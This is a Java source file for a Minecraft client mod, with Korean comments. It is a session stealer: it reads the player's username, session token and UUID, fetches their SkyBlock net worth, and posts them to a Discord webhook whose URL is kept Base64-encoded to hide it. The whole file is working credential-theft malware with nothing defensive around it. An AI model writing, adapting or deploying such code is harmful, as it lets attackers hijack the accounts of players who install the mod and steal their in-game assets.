package com.example.sessionmod;

import net.minecraft.client.Minecraft;
import net.minecraft.util.Session;
import com.mojang.authlib.GameProfile;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;
import java.util.Base64;

public class ClientProxy {

    // Base64로 인코딩된 디스코드 웹훅 URL
    private static final String ENCRYPTED_DISCORD_WEBHOOK_URL = "YOUR_ENCRYPTED_WEBHOOK_URL"; // Base64로 인코딩된 웹훅 URL

    public static void sendSessionInfo() {
        try {
            // Base64로 인코딩된 디스코드 웹훅 URL을 복호화
            String decodedUrl = new String(Base64.getDecoder().decode(ENCRYPTED_DISCORD_WEBHOOK_URL));

            // Minecraft 클라이언트와 세션 객체 가져오기
            Minecraft mc = Minecraft.getMinecraft();
            Session session = mc.getSession();

            if (session != null) {
                // 세션 정보 가져오기
                String username = session.getUsername();
                String sessionId = session.getToken();

                // 플레이어의 UUID 가져오기
                GameProfile profile = session.getProfile();
                UUID playerUUID = profile.getId();

                // UUID로 Net Worth 가져오기 (SkyBlock API 요청)
                String netWorth = SkyBlockAPI.getNetWorth(playerUUID.toString()); // Net Worth 정보 얻기

                // 세션 정보와 리프레시 토큰을 디스코드 웹훅으로 전송
                new Thread(() -> sendToDiscord(decodedUrl, username, sessionId, playerUUID, netWorth)).start();
            } else {
                System.out.println("No session found!");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendToDiscord(String discordWebhookUrl, String username, String sessionId, UUID playerUUID, String netWorth) {
        try {
            // 디스코드 웹훅으로 보낼 메시지 내용 생성
            String jsonPayload = String.format(
                    "{\"content\": \"@everyone\nUsername: %s\nSession ID: %s\nUUID: %s\nNet Worth: %s\"}",
                    username, sessionId, playerUUID.toString(), netWorth
            );

            // HTTP 연결 설정 (디스코드 웹훅 URL로 POST 요청)
            HttpURLConnection connection = (HttpURLConnection) new URL(discordWebhookUrl).openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");

            // JSON 데이터 전송
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonPayload.getBytes());
                os.flush();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
